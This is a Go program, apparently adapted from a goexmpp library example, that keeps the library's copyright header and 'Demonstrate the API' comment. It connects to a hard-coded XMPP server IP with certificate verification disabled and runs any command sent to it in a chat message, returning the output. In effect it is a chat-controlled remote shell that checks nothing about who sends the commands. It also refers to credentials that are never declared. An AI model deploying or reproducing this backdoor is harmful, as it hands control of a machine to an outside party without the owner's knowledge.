// Copyright 2011 The Go Authors.  All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

package main

import (
	"crypto/tls"
	"encoding/xml"
	"fmt"
	"log"
    "os/exec"
    "sync"
    "time"
    
    xmpp "code.google.com/p/goexmpp"
    "github.com/mattn/go-shellwords"
)

type StdLogger struct {
}

func (s *StdLogger) Log(v ...interface{}) {
	log.Println(v...)
}

func (s *StdLogger) Logf(fmt string, v ...interface{}) {
	log.Printf(fmt, v...)
}

func init() {
	logger := &StdLogger{}
	xmpp.Debug = logger
	xmpp.Info = logger
	xmpp.Warn = logger

	xmpp.TlsConfig = tls.Config{InsecureSkipVerify: true}
}

// Demonstrate the API, and allow the user to interact with an XMPP
// server via the terminal.
func main() {   

	client, err := xmpp.NewClientFromHost(&jid, pw, nil, "208.112.63.36", 5222)
	if err != nil {
		log.Fatalf("NewClient(%v): %v", jid, err)
	}
	defer close(client.Out)

	err = client.StartSession(true, &xmpp.Presence{})
	if err != nil {
		log.Fatalf("StartSession: %v", err)
	}

	go func(CLIENT *xmpp.Client) {
		for {
            stanza := <-client.In
            if msg, ok := stanza.(*xmpp.Message); ok {
                if msg.Body != nil {
                
                    origto := msg.To
                    origfrom := msg.From                    
                    msg.To = origfrom
                    msg.From = origto
                    
                    cmdparts, _ := shellwords.Parse(msg.Body.Chardata)                    
                    
                    fmt.Println(cmdparts)
                    
                    var cmd *exec.Cmd
                    if len(cmdparts) == 1 {
                        cmd = exec.Command(cmdparts[0])
                    } else if len(cmdparts) > 1 {
                        cmd = exec.Command(cmdparts[0], cmdparts[1:]...)
                    }
                    
                    go func(CMD *exec.Cmd){
                        time.Sleep(time.Millisecond * 15000)
                        if CMD.Process != nil {
                            CMD.Process.Kill()
                        }                        
                    }(cmd)
                    
                    var finalout string
                    output, outerr := cmd.CombinedOutput()
                    if outerr != nil {
                        finalout = "\n"+string(output) + outerr.Error()
                    } else {
                        finalout = "\n"+string(output)
                    }
                                        
                    msg.Innerxml = ""
                    msg.Body = &xmpp.Generic{
                        XMLName: xml.Name{"jabber:client", "body"},
                        Chardata: finalout,
                    }
                    
                    CLIENT.Out <- msg
                }                
            }             
		}
		fmt.Println("done reading")
	}(client)

	go func(CLIENT *xmpp.Client) {
        ticker := time.NewTicker(time.Millisecond * 30000)        
        for {
            select {
                case <-ticker.C:
                    CLIENT.Out <- &xmpp.Presence{}
            }            
        }
    }(client)
    
    var wg sync.WaitGroup    
    wg.Add(2)
    wg.Wait()
}
